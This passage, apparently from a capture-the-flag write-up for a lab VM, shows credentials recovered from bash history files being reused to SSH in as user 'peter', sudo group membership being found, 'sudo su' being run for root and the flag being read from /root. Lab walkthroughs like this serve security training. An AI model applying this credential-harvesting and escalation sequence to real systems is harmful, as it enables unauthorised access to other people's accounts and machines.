exit
exit
exit
exit
id
exit
top
ps aux
exit
exit
exit
exit
cat: home/peter/.bash_history: Permission denied
top
exit
```

The bash history reveals the password for two <acronym title="Secure Shell">SSH</acronym> users JKanode and peter.  
Additionally, it seems the history for _peter_ is the only one we did not have permission to print.  
We use _ssh_ to login as peter, to check whether there is anything interesting in the bash history and to check what capabilities this user has.  

```
$ ssh peter@10.0.2.5

-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@10.0.2.5's password: 
Welcome back!

red% cat .bash_history

red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

It appears the bash history is empty, but _peter_ has sudo access.  
We can use _sudo_ to escalate to root access and then access the CTF flag which is usually in the /root/ folder.  

```
red% sudo su
➜  peter

➜  peter id
uid=0(root) gid=0(root) groups=0(root)

➜  peter ls /root 
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql

➜  peter cat /root/flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```
